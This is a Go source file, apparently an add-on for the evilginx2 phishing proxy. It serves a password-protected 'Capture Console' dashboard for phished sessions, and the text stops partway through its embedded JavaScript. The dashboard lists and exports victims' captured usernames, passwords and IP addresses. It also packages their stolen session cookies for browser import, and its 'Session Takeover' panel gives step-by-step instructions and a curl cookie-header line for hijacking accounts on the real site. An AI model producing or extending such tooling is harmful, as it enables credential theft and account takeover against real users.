package core

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// DashboardConfig holds the web dashboard configuration.
type DashboardConfig struct {
	Enabled     bool   `json:"enabled"`
	BindAddress string `json:"bind_address"`
	Username    string `json:"username"`
	Password    string `json:"password"`
}

// DashboardServer manages the HTTP server and session data for the web dashboard.
type DashboardServer struct {
	config     *DashboardConfig
	db         *database.Database
	phishCfg   *Config
	server     *http.Server
	mu         sync.RWMutex
	sessions   []*database.Session
}

// NewDashboardServer creates a new dashboard server instance.
func NewDashboardServer(cfg *DashboardConfig, db *database.Database, phishCfg *Config) (*DashboardServer, error) {
	if cfg == nil {
		return nil, fmt.Errorf("dashboard: config is nil")
	}
	if db == nil {
		return nil, fmt.Errorf("dashboard: database reference is nil")
	}
	return &DashboardServer{
		config:   cfg,
		db:       db,
		phishCfg: phishCfg,
	}, nil
}

// buildMux constructs and returns the dashboard HTTP mux.
func (ds *DashboardServer) buildMux() *http.ServeMux {
	mux := http.NewServeMux()
	mux.HandleFunc("/", ds.basicAuth(ds.handleDashboard))
	mux.HandleFunc("/api/sessions", ds.basicAuth(ds.handleAPISessions))
	mux.HandleFunc("/api/sessions/export", ds.basicAuth(ds.handleExportSessions))
	mux.HandleFunc("/api/sessions/", ds.basicAuth(ds.handleAPISessionDetail))
	mux.HandleFunc("/api/cookies/", ds.basicAuth(ds.handleAPICookies))
	mux.HandleFunc("/static/", ds.basicAuth(ds.handleStatic))
	return mux
}

// SetCredentials updates the basic-auth username and password at runtime.
func (ds *DashboardServer) SetCredentials(user, pass string) {
	ds.mu.Lock()
	defer ds.mu.Unlock()
	ds.config.Username = user
	ds.config.Password = pass
}

// Handler returns an http.Handler that serves the dashboard.
// Used to attach the dashboard to a virtual host in the main HTTPS proxy.
func (ds *DashboardServer) Handler() http.Handler {
	return ds.buildMux()
}

// Start begins the dashboard HTTP server on the configured address.
func (ds *DashboardServer) Start() error {
	if !ds.config.Enabled {
		log.Info("dashboard: web interface is disabled")
		return nil
	}

	ds.server = &http.Server{
		Addr:         ds.config.BindAddress,
		Handler:      ds.buildMux(),
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	go func() {
		log.Info("dashboard: web interface starting on http://%s", ds.config.BindAddress)
		if err := ds.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Error("dashboard: server error: %v", err)
		}
	}()

	return nil
}

// Stop gracefully shuts down the dashboard HTTP server.
func (ds *DashboardServer) Stop() error {
	if ds.server != nil {
		log.Info("dashboard: shutting down web interface")
		return ds.server.Close()
	}
	return nil
}

// basicAuth is HTTP middleware that enforces Basic Authentication.
func (ds *DashboardServer) basicAuth(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if ds.config.Username == "" && ds.config.Password == "" {
			next(w, r)
			return
		}
		user, pass, ok := r.BasicAuth()
		if !ok || user != ds.config.Username || pass != ds.config.Password {
			w.Header().Set("WWW-Authenticate", `Basic realm="Control Panel"`)
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
		next(w, r)
	}
}

// refreshSessions reloads the session cache from the database.
func (ds *DashboardServer) refreshSessions() error {
	ds.mu.Lock()
	defer ds.mu.Unlock()

	sessions, err := ds.db.ListSessions()
	if err != nil {
		return fmt.Errorf("dashboard: failed to list sessions: %v", err)
	}

	sort.Slice(sessions, func(i, j int) bool {
		return sessions[i].CreateTime > sessions[j].CreateTime
	})

	ds.sessions = sessions
	return nil
}

// handleDashboard renders the main dashboard HTML page.
func (ds *DashboardServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	tmpl := template.Must(template.New("dashboard").Parse(dashboardHTML))
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	tmpl.Execute(w, map[string]string{
		"Title": "Capture Console",
	})
}

// handleAPISessions returns sessions as JSON with optional search/filter parameters.
func (ds *DashboardServer) handleAPISessions(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if err := ds.refreshSessions(); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	ds.mu.RLock()
	defer ds.mu.RUnlock()

	searchQuery := strings.ToLower(r.URL.Query().Get("search"))
	phishletFilter := r.URL.Query().Get("phishlet")
	limitStr := r.URL.Query().Get("limit")
	offsetStr := r.URL.Query().Get("offset")

	limit := 100
	if limitStr != "" {
		if l, err := strconv.Atoi(limitStr); err == nil && l > 0 {
			limit = l
		}
	}
	offset := 0
	if offsetStr != "" {
		if o, err := strconv.Atoi(offsetStr); err == nil && o >= 0 {
			offset = o
		}
	}

	var filtered []*database.Session
	for _, s := range ds.sessions {
		if phishletFilter != "" && s.Phishlet != phishletFilter {
			continue
		}
		if searchQuery != "" {
			if !strings.Contains(strings.ToLower(s.Username), searchQuery) &&
				!strings.Contains(strings.ToLower(s.Password), searchQuery) &&
				!strings.Contains(strings.ToLower(s.Phishlet), searchQuery) &&
				!strings.Contains(strings.ToLower(s.RemoteAddr), searchQuery) {
				continue
			}
		}
		filtered = append(filtered, s)
	}

	totalCount := len(filtered)
	if offset > len(filtered) {
		filtered = nil
	} else {
		end := offset + limit
		if end > len(filtered) {
			end = len(filtered)
		}
		filtered = filtered[offset:end]
	}

	response := map[string]interface{}{
		"sessions":  filtered,
		"total":     totalCount,
		"count":     len(filtered),
		"offset":    offset,
		"limit":     limit,
		"phishlets": ds.getPhishletNames(),
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// handleAPISessionDetail returns a single session by ID.
func (ds *DashboardServer) handleAPISessionDetail(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodDelete {
		parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/sessions/"), "/")
		if len(parts) == 0 || parts[0] == "" {
			http.Error(w, "Session ID required", http.StatusBadRequest)
			return
		}
		id, err := strconv.Atoi(parts[0])
		if err != nil {
			http.Error(w, "Invalid session ID", http.StatusBadRequest)
			return
		}
		if err := ds.db.DeleteSessionById(id); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]string{"status": "deleted"})
		return
	}

	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/sessions/"), "/")
	if len(parts) == 0 || parts[0] == "" {
		http.Error(w, "Session ID required", http.StatusBadRequest)
		return
	}
	id, err := strconv.Atoi(parts[0])
	if err != nil {
		http.Error(w, "Invalid session ID", http.StatusBadRequest)
		return
	}

	if err := ds.refreshSessions(); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	ds.mu.RLock()
	defer ds.mu.RUnlock()

	for _, s := range ds.sessions {
		if s.Id == id {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(s)
			return
		}
	}
	http.Error(w, "Session not found", http.StatusNotFound)
}

// handleExportSessions exports sessions in CSV or JSON format.
func (ds *DashboardServer) handleExportSessions(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if err := ds.refreshSessions(); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	ds.mu.RLock()
	defer ds.mu.RUnlock()

	format := r.URL.Query().Get("format")
	if format == "" {
		format = "csv"
	}

	switch format {
	case "csv":
		w.Header().Set("Content-Type", "text/csv")
		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=sessions_%d.csv", time.Now().Unix()))
		writer := csv.NewWriter(w)
		defer writer.Flush()
		writer.Write([]string{"ID", "Phishlet", "Username", "Password", "Remote Address", "User-Agent", "Landing URL", "Created (UTC)"})
		for _, s := range ds.sessions {
			writer.Write([]string{
				strconv.Itoa(s.Id), s.Phishlet, s.Username, s.Password,
				s.RemoteAddr, s.UserAgent, s.LandingURL,
				time.Unix(s.CreateTime, 0).UTC().Format("2006-01-02 15:04:05"),
			})
		}
	case "json":
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=sessions_%d.json", time.Now().Unix()))
		json.NewEncoder(w).Encode(ds.sessions)
	default:
		http.Error(w, "Unsupported export format. Use 'csv' or 'json'.", http.StatusBadRequest)
	}
}

// handleAPICookies returns captured cookie tokens for a session formatted as
// Cookie-Editor / EditThisCookie compatible JSON, ready for browser import.
func (ds *DashboardServer) handleAPICookies(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/cookies/"), "/")
	if len(parts) == 0 || parts[0] == "" {
		http.Error(w, "Session ID required", http.StatusBadRequest)
		return
	}
	id, err := strconv.Atoi(parts[0])
	if err != nil {
		http.Error(w, "Invalid session ID", http.StatusBadRequest)
		return
	}

	if err := ds.refreshSessions(); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	ds.mu.RLock()
	defer ds.mu.RUnlock()

	var target *database.Session
	for _, s := range ds.sessions {
		if s.Id == id {
			target = s
			break
		}
	}
	if target == nil {
		http.Error(w, "Session not found", http.StatusNotFound)
		return
	}

	type CookieExport struct {
		Name           string  `json:"name"`
		Value          string  `json:"value"`
		Domain         string  `json:"domain"`
		HostOnly       bool    `json:"hostOnly"`
		Path           string  `json:"path"`
		Secure         bool    `json:"secure"`
		HttpOnly       bool    `json:"httpOnly"`
		SameSite       string  `json:"sameSite"`
		Session        bool    `json:"session"`
		ExpirationDate int64   `json:"expirationDate"`
		StoreID        *string `json:"storeId"`
	}

	expiry := time.Now().AddDate(1, 0, 0).Unix()
	var cookies []CookieExport

	for domain, tokenGroup := range target.CookieTokens {
		cookieDomain := domain
		if !strings.HasPrefix(cookieDomain, ".") {
			cookieDomain = "." + cookieDomain
		}
		for _, tok := range tokenGroup {
			path := tok.Path
			if path == "" {
				path = "/"
			}
			cookies = append(cookies, CookieExport{
				Name:           tok.Name,
				Value:          tok.Value,
				Domain:         cookieDomain,
				HostOnly:       false,
				Path:           path,
				Secure:         tok.Secure,
				HttpOnly:       tok.HttpOnly,
				SameSite:       "Lax",
				Session:        false,
				ExpirationDate: expiry,
				StoreID:        nil,
			})
		}
	}

	// Resolve the target login URL from the phishlet config if available.
	targetURL := ""
	if ds.phishCfg != nil {
		if pl, err := ds.phishCfg.GetPhishlet(target.Phishlet); err == nil {
			targetURL = pl.GetLoginUrl()
		}
	}
	if targetURL == "" {
		// Fallback: use the first cookie domain as a best-effort target.
		for domain := range target.CookieTokens {
			clean := strings.TrimPrefix(domain, ".")
			targetURL = "https://" + clean
			break
		}
	}

	// Build a Cookie header string for use with curl / Burp.
	cookieHeaderParts := make([]string, 0, len(cookies))
	for _, c := range cookies {
		cookieHeaderParts = append(cookieHeaderParts, c.Name+"="+c.Value)
	}
	cookieHeader := strings.Join(cookieHeaderParts, "; ")

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"session_id":    id,
		"phishlet":      target.Phishlet,
		"cookies":       cookies,
		"target_url":    targetURL,
		"count":         len(cookies),
		"cookie_header": cookieHeader,
	})
}

// handleStatic serves embedded static assets.
func (ds *DashboardServer) handleStatic(w http.ResponseWriter, r *http.Request) {
	http.NotFound(w, r)
}

// getPhishletNames returns a deduplicated list of phishlet names from cached sessions.
func (ds *DashboardServer) getPhishletNames() []string {
	names := make(map[string]bool)
	for _, s := range ds.sessions {
		if s.Phishlet != "" {
			names[s.Phishlet] = true
		}
	}
	var result []string
	for name := range names {
		result = append(result, name)
	}
	sort.Strings(result)
	return result
}

const dashboardHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{{.Title}}</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0d1117;--surf:#161b22;--surf2:#1c2128;--border:#30363d;
  --text:#e6edf3;--muted:#8b949e;--dim:#6e7681;
  --green:#3fb950;--green-bg:#1a3324;
  --red:#f85149;--red-bg:#3d1a1a;
  --amber:#d29922;--blue:#58a6ff;
  --mono:ui-monospace,'SFMono-Regular',Consolas,monospace;
}
[data-theme="light"]{
  --bg:#f6f8fa;--surf:#ffffff;--surf2:#f6f8fa;--border:#d0d7de;
  --text:#1f2328;--muted:#656d76;--dim:#9a9ea6;
  --green:#1a7f37;--green-bg:#dafbe1;
  --red:#cf222e;--red-bg:#ffebe9;
  --amber:#9a6700;--blue:#0969da;
}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
  background:var(--bg);color:var(--text);font-size:13px;line-height:1.5;min-height:100vh}
a{color:var(--blue);text-decoration:none}

/* Layout */
.wrap{max-width:1440px;margin:0 auto;padding:16px}

/* Topbar */
.topbar{display:flex;align-items:center;justify-content:space-between;
  padding:10px 16px;background:var(--surf);border:1px solid var(--border);
  border-radius:6px;margin-bottom:12px;gap:12px;flex-wrap:wrap}
.topbar-left{display:flex;align-items:center;gap:12px}
.logo{font-size:15px;font-weight:600;letter-spacing:-.3px;color:var(--text)}
.logo span{color:var(--green);font-family:var(--mono)}
.divider{width:1px;height:18px;background:var(--border)}
.refresh-badge{font-family:var(--mono);font-size:11px;color:var(--muted);
  background:var(--surf2);border:1px solid var(--border);border-radius:4px;
  padding:2px 8px;cursor:default}
.refresh-badge.live{color:var(--green);border-color:var(--green-bg)}
.topbar-right{display:flex;gap:8px;align-items:center}

/* Buttons */
.btn{display:inline-flex;align-items:center;gap:5px;padding:5px 12px;
  border:1px solid var(--border);border-radius:6px;background:var(--surf);
  color:var(--text);cursor:pointer;font-size:12px;font-family:inherit;
  transition:background .15s,border-color .15s;white-space:nowrap}
.btn:hover{background:var(--surf2);border-color:var(--muted)}
.btn-green{background:var(--green-bg);border-color:var(--green);color:var(--green)}
.btn-green:hover{filter:brightness(1.1)}
.btn-red{background:var(--red-bg);border-color:var(--red);color:var(--red)}
.btn-red:hover{filter:brightness(1.1)}
.btn-sm{padding:3px 8px;font-size:11px}

/* Stats strip */
.stats-strip{display:flex;gap:1px;margin-bottom:12px;
  background:var(--border);border:1px solid var(--border);border-radius:6px;overflow:hidden}
.stat{flex:1;background:var(--surf);padding:10px 16px;min-width:100px}
.stat-label{font-size:10px;text-transform:uppercase;letter-spacing:.06em;
  color:var(--muted);font-weight:600;margin-bottom:2px}
.stat-value{font-size:22px;font-weight:700;font-family:var(--mono);color:var(--text);line-height:1.2}
.stat-value.green{color:var(--green)}
.stat-value.amber{color:var(--amber)}
.stat-sub{font-size:10px;color:var(--dim);margin-top:1px;font-family:var(--mono)}

/* Phishlet breakdown */
.phishlet-row{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
.pl-chip{font-family:var(--mono);font-size:11px;padding:3px 9px;border-radius:4px;
  border:1px solid var(--border);background:var(--surf2);color:var(--muted);cursor:pointer;
  transition:all .15s}
.pl-chip:hover,.pl-chip.active{background:var(--surf);border-color:var(--blue);color:var(--blue)}

/* Filter bar */
.filter-bar{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap;align-items:center}
.filter-bar input,.filter-bar select{
  padding:5px 10px;border:1px solid var(--border);border-radius:6px;
  background:var(--surf);color:var(--text);font-size:12px;font-family:inherit;outline:none}
.filter-bar input{flex:1;min-width:180px}
.filter-bar input:focus,.filter-bar select:focus{border-color:var(--blue)}
.filter-bar select{min-width:120px}
.filter-count{font-size:11px;color:var(--muted);white-space:nowrap;margin-left:auto}

/* Table */
.tbl-wrap{border:1px solid var(--border);border-radius:6px;overflow:hidden;margin-bottom:12px}
table{width:100%;border-collapse:collapse;background:var(--surf)}
thead{background:var(--surf2);border-bottom:1px solid var(--border)}
th{padding:8px 12px;text-align:left;font-size:11px;font-weight:600;
  text-transform:uppercase;letter-spacing:.05em;color:var(--muted);
  cursor:pointer;user-select:none;white-space:nowrap}
th:hover{color:var(--text)}
th .sort-ind{opacity:.4;margin-left:3px;font-size:9px}
th.sorted .sort-ind{opacity:1;color:var(--blue)}
td{padding:7px 12px;border-bottom:1px solid var(--border);
  max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
  vertical-align:middle}
tbody tr:last-child td{border-bottom:none}
tbody tr:hover{background:var(--surf2)}
tbody tr.selected{background:rgba(88,166,255,.06)}

/* Cell types */
.cell-mono{font-family:var(--mono);font-size:12px}
.cell-id{color:var(--dim);font-family:var(--mono);font-size:11px}
.cell-copy{cursor:pointer;position:relative}
.cell-copy:hover .copy-hint{opacity:1}
.copy-hint{position:absolute;right:6px;top:50%;transform:translateY(-50%);
  font-size:9px;color:var(--muted);opacity:0;transition:opacity .15s;
  background:var(--surf2);padding:2px 4px;border-radius:3px;pointer-events:none}
.tag{display:inline-block;font-size:10px;font-weight:600;padding:1px 7px;
  border-radius:3px;font-family:var(--mono);vertical-align:middle}
.tag-pl{background:var(--surf2);border:1px solid var(--border);color:var(--muted)}
.tag-ok{background:var(--green-bg);border:1px solid var(--green);color:var(--green)}
.tag-none{background:var(--surf2);border:1px solid var(--border);color:var(--dim)}
.tag-pw{font-family:var(--mono);font-size:12px;letter-spacing:.05em}

/* Checkbox */
.chk{width:14px;height:14px;accent-color:var(--blue);cursor:pointer}

/* Empty */
.empty{text-align:center;padding:48px;color:var(--muted)}
.empty-icon{font-size:28px;margin-bottom:8px;opacity:.4}
.empty p{font-size:13px}

/* Pagination */
.pagination{display:flex;align-items:center;justify-content:space-between;
  padding:8px 12px;background:var(--surf);border:1px solid var(--border);
  border-radius:6px;gap:8px;flex-wrap:wrap}
.page-info{font-size:12px;color:var(--muted);font-family:var(--mono)}
.page-btns{display:flex;gap:6px}
.bulk-bar{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--muted)}

/* Detail panel */
.detail-panel{background:var(--surf);border:1px solid var(--border);border-radius:6px;
  margin-bottom:12px;overflow:hidden}
.detail-header{display:flex;align-items:center;justify-content:space-between;
  padding:10px 16px;border-bottom:1px solid var(--border);background:var(--surf2)}
.detail-header h3{font-size:13px;font-weight:600}
.detail-body{padding:16px;display:grid;grid-template-columns:1fr 1fr;gap:12px}
.detail-field{display:flex;flex-direction:column;gap:3px}
.detail-field label{font-size:10px;text-transform:uppercase;letter-spacing:.06em;
  color:var(--muted);font-weight:600}
.detail-field .fval{font-family:var(--mono);font-size:12px;color:var(--text);
  background:var(--surf2);padding:4px 8px;border-radius:4px;border:1px solid var(--border);
  overflow-x:auto;word-break:break-all;white-space:pre-wrap;cursor:pointer}
.detail-field .fval:hover{border-color:var(--blue)}
.detail-tokens{grid-column:1/-1}
.detail-tokens pre{background:var(--bg);padding:12px;border-radius:4px;
  border:1px solid var(--border);font-family:var(--mono);font-size:11px;
  overflow-x:auto;max-height:260px;white-space:pre-wrap;word-break:break-all;color:var(--text)}
.detail-ua{grid-column:1/-1}

/* Toast */
.toast{position:fixed;bottom:20px;right:20px;padding:10px 16px;border-radius:6px;
  font-size:13px;z-index:9999;opacity:0;transform:translateY(4px);
  transition:opacity .2s,transform .2s;pointer-events:none;max-width:320px}
.toast.on{opacity:1;transform:translateY(0)}
.toast-ok{background:var(--green);color:#fff}
.toast-err{background:var(--red);color:#fff}
.toast-info{background:var(--surf2);color:var(--text);border:1px solid var(--border)}

/* Theme toggle dot */
.theme-dot{width:8px;height:8px;border-radius:50%;background:var(--amber);display:inline-block;margin-right:4px}

@media(max-width:700px){
  .stats-strip{flex-direction:column;gap:0}
  .detail-body{grid-template-columns:1fr}
  .detail-ua,.detail-tokens{grid-column:1}
  td,th{padding:6px 8px}
}
</style>
</head>
<body>
<div class="wrap">

  <!-- Topbar -->
  <div class="topbar">
    <div class="topbar-left">
      <div class="logo">Capture <span>Console</span></div>
      <div class="divider"></div>
      <div id="refreshBadge" class="refresh-badge live">LIVE</div>
    </div>
    <div class="topbar-right">
      <button class="btn" onclick="toggleTheme()"><span class="theme-dot" id="themeDot"></span><span id="themeLabel">Light</span></button>
      <button class="btn" onclick="toggleAutoRefresh()" id="arBtn">Pause</button>
      <button class="btn btn-green" onclick="exportCSV()">Export CSV</button>
      <button class="btn" onclick="exportJSON()">Export JSON</button>
      <button class="btn" onclick="manualRefresh()">Refresh</button>
    </div>
  </div>

  <!-- Stats -->
  <div class="stats-strip" id="statsStrip">
    <div class="stat"><div class="stat-label">Total</div><div class="stat-value" id="sStat">0</div><div class="stat-sub">&nbsp;</div></div>
    <div class="stat"><div class="stat-label">With Tokens</div><div class="stat-value green" id="tStat">0</div><div class="stat-sub" id="tPct">&nbsp;</div></div>
    <div class="stat"><div class="stat-label">No Tokens</div><div class="stat-value amber" id="ntStat">0</div><div class="stat-sub">&nbsp;</div></div>
    <div class="stat"><div class="stat-label">Unique IPs</div><div class="stat-value" id="ipStat">0</div><div class="stat-sub">&nbsp;</div></div>
    <div class="stat"><div class="stat-label">Phishlets</div><div class="stat-value" id="plStat">0</div><div class="stat-sub">&nbsp;</div></div>
    <div class="stat"><div class="stat-label">Last Capture</div><div class="stat-value" style="font-size:14px" id="lcStat">--</div><div class="stat-sub" id="lcSub">&nbsp;</div></div>
  </div>

  <!-- Phishlet chips -->
  <div class="phishlet-row" id="plChips"></div>

  <!-- Filters -->
  <div class="filter-bar">
    <input type="text" id="searchInput" placeholder="Search username, password, IP, user-agent..." oninput="applyFilters()">
    <select id="phishletFilter" onchange="applyFilters()">
      <option value="">All phishlets</option>
    </select>
    <select id="tokenFilter" onchange="applyFilters()">
      <option value="">All captures</option>
      <option value="yes">Tokens captured</option>
      <option value="no">No tokens</option>
    </select>
    <button class="btn btn-sm" onclick="clearFilters()">Clear</button>
    <span class="filter-count" id="filterCount"></span>
  </div>

  <!-- Session detail -->
  <div class="detail-panel" id="detailPanel" style="display:none">
    <div class="detail-header">
      <h3 id="detailTitle">Session Detail</h3>
      <div style="display:flex;gap:8px">
        <button class="btn btn-sm" onclick="copyAll()">Copy All</button>
        <button class="btn btn-sm btn-green" id="injectBtn" onclick="injectSession()" style="display:none">Inject Session</button>
        <button class="btn btn-sm btn-red" id="detailDelBtn" onclick="deleteCurrentDetail()">Delete</button>
        <button class="btn btn-sm" onclick="closeDetail()">Close</button>
      </div>
    </div>
    <div class="detail-body" id="detailBody"></div>
  </div>

  <!-- Inject modal -->
  <div id="injectModal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:9000;align-items:center;justify-content:center">
    <div style="background:var(--surf);border:1px solid var(--border);border-radius:8px;max-width:520px;width:90%;padding:24px">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
        <h3 style="font-size:14px;font-weight:600">Session Takeover</h3>
        <button class="btn btn-sm" onclick="closeInjectModal()">Close</button>
      </div>
      <div style="background:var(--green-bg);border:1px solid var(--green);border-radius:6px;padding:12px;margin-bottom:16px">
        <div style="color:var(--green);font-size:12px;font-weight:600;margin-bottom:4px">&#10003; Cookie file downloaded</div>
        <div style="color:var(--text);font-size:12px" id="injectCookieCount"></div>
      </div>
      <div style="font-size:12px;color:var(--muted);margin-bottom:12px;line-height:1.8">
        <b style="color:var(--text)">Browser import (Cookie-Editor):</b><br>
        1. Install the <b>Cookie-Editor</b> browser extension<br>
        2. Click <b>Open Target Site</b> — a new tab opens on the real site<br>
        3. On that tab, open Cookie-Editor &rarr; click <b>Import</b><br>
        4. Paste the downloaded JSON and confirm &rarr; Reload the page
      </div>
      <div style="font-size:12px;color:var(--muted);margin-bottom:16px;line-height:1.8">
        <b style="color:var(--text)">Curl / Burp (raw header):</b><br>
        Click <b>Copy Cookie Header</b> then use:<br>
        <code style="font-size:11px;color:var(--text)">curl -b "..." https://target</code>
      </div>
      <div style="display:flex;gap:8px;flex-wrap:wrap">
        <button class="btn btn-green" id="openTargetBtn" onclick="openTargetSite()">Open Target Site</button>
        <button class="btn btn-sm" onclick="copyCookieHeader()">Copy Cookie Header</button>
        <button class="btn btn-sm" onclick="reDownloadCookies()">Re-download JSON</button>
      </div>
    </div>
  </div>

  <!-- Table -->
  <div class="tbl-wrap">
    <table>
      <thead>
        <tr>
          <th style="width:32px"><input type="checkbox" class="chk" id="selectAll" onchange="toggleSelectAll(this)"></th>
          <th onclick="sortBy('id')">ID <span class="sort-ind" id="si-id"></span></th>
          <th onclick="sortBy('phishlet')">Phishlet <span class="sort-ind" id="si-phishlet"></span></th>
          <th onclick="sortBy('username')">Username <span class="sort-ind" id="si-username"></span></th>
          <th onclick="sortBy('password')">Password <span class="sort-ind" id="si-password"></span></th>
          <th onclick="sortBy('remote_addr')">IP Address <span class="sort-ind" id="si-remote_addr"></span></th>
          <th onclick="sortBy('tokens')">Tokens <span class="sort-ind" id="si-tokens"></span></th>
          <th onclick="sortBy('create_time')">Captured <span class="sort-ind" id="si-create_time"></span></th>
          <th style="width:60px">Del</th>
        </tr>
      </thead>
      <tbody id="tbody">
        <tr><td colspan="9"><div class="empty"><div class="empty-icon">&#9201;</div><p>Loading...</p></div></td></tr>
      </tbody>
    </table>
  </div>

  <!-- Pagination + bulk -->
  <div class="pagination">
    <div class="bulk-bar">
      <span id="selCount">0 selected</span>
      <button class="btn btn-sm btn-red" id="bulkDelBtn" onclick="bulkDelete()" style="display:none">Delete Selected</button>
    </div>
    <span class="page-info" id="pageInfo">Page 1 of 1</span>
    <div class="page-btns">
      <button class="btn btn-sm" onclick="prevPage()">Prev</button>
      <button class="btn btn-sm" onclick="nextPage()">Next</button>
    </div>
  </div>

</div>

<div id="toast" class="toast"></div>

<script>
var allSessions = [];
var filtered = [];
var currentPage = 0;
var pageSize = 50;
var sortField = 'create_time';
var sortAsc = false;
var autoRefresh = true;
var arTimer = null;
var arCountdown = 10;
var selectedIds = new Set();
var currentDetailId = null;
var isDark = true;

// --- Theme ---
function toggleTheme() {
  isDark = !isDark;
  document.documentElement.setAttribute('data-theme', isDark ? '' : 'light');
  document.getElementById('themeLabel').textContent = isDark ? 'Light' : 'Dark';
  document.getElementById('themeDot').style.background = isDark ? 'var(--amber)' : 'var(--blue)';
}

// --- Auto-refresh ---
function startAR() {
  arCountdown = 10;
  clearInterval(arTimer);
  arTimer = setInterval(function() {
    arCountdown--;
    var badge = document.getElementById('refreshBadge');
    if (arCountdown <= 0) {
      badge.textContent = 'LIVE';
      badge.className = 'refresh-badge live';
      refreshSessions();
      arCountdown = 10;
    } else {
      badge.textContent = arCountdown + 's';
      badge.className = 'refresh-badge';
    }
  }, 1000);
}

function toggleAutoRefresh() {
  autoRefresh = !autoRefresh;
  var btn = document.getElementById('arBtn');
  var badge = document.getElementById('refreshBadge');
  if (autoRefresh) {
    btn.textContent = 'Pause';
    badge.textContent = 'LIVE';
    badge.className = 'refresh-badge live';
    startAR();
  } else {
    btn.textContent = 'Resume';
    badge.textContent = 'PAUSED';
    badge.className = 'refresh-badge';
    clearInterval(arTimer);
  }
}

function manualRefresh() { refreshSessions(); if (autoRefresh) { arCountdown = 10; } }

document.addEventListener('visibilitychange', function() {
  if (document.hidden) { clearInterval(arTimer); }
  else if (autoRefresh) { startAR(); refreshSessions(); }
});

// --- Data ---
function hasTokens(s) {
  return (s.tokens && Object.keys(s.tokens).length > 0) ||
         (s.body_tokens && Object.keys(s.body_tokens).length > 0) ||
         (s.http_tokens && Object.keys(s.http_tokens).length > 0);
}

async function refreshSessions() {
  try {
    var resp = await fetch('/api/sessions?limit=10000');
    var data = await resp.json();
    allSessions = data.sessions || [];
    updatePhishletChips(data.phishlets || []);
    updateStats();
    applyFilters();
  } catch(e) { /* silent */ }
}

function updateStats() {
  var total = allSessions.length;
  var withTok = allSessions.filter(hasTokens).length;
  var noTok = total - withTok;
  var ips = new Set(allSessions.map(function(s){return s.remote_addr})).size;
  var pls = new Set(allSessions.map(function(s){return s.phishlet})).size;

  document.getElementById('sStat').textContent = total;
  document.getElementById('tStat').textContent = withTok;
  document.getElementById('tPct').textContent = total > 0 ? Math.round(withTok/total*100) + '% rate' : '';
  document.getElementById('ntStat').textContent = noTok;
  document.getElementById('ipStat').textContent = ips;
  document.getElementById('plStat').textContent = pls;

  if (allSessions.length > 0) {
    var last = allSessions.reduce(function(a,b){return a.create_time > b.create_time ? a : b});
    var d = new Date(last.create_time * 1000);
    document.getElementById('lcStat').textContent = d.toLocaleTimeString();
    document.getElementById('lcSub').textContent = d.toLocaleDateString();
  } else {
    document.getElementById('lcStat').textContent = '--';
    document.getElementById('lcSub').textContent = '';
  }
}

function updatePhishletChips(phishlets) {
  var container = document.getElementById('plChips');
  var sel = document.getElementById('phishletFilter');
  var curVal = sel.value;

  var counts = {};
  allSessions.forEach(function(s){ counts[s.phishlet] = (counts[s.phishlet]||0)+1; });

  sel.innerHTML = '<option value="">All phishlets</option>' +
    phishlets.map(function(p){ return '<option value="'+p+'">'+p+'</option>'; }).join('');
  sel.value = curVal;

  if (phishlets.length === 0) { container.innerHTML = ''; return; }
  container.innerHTML = phishlets.map(function(p) {
    var active = curVal === p ? ' active' : '';
    return '<span class="pl-chip'+active+'" onclick="setPlFilter(\''+esc(p)+'\')">' + esc(p) + ' <b>' + (counts[p]||0) + '</b></span>';
  }).join('');
}

function setPlFilter(val) {
  var sel = document.getElementById('phishletFilter');
  sel.value = sel.value === val ? '' : val;
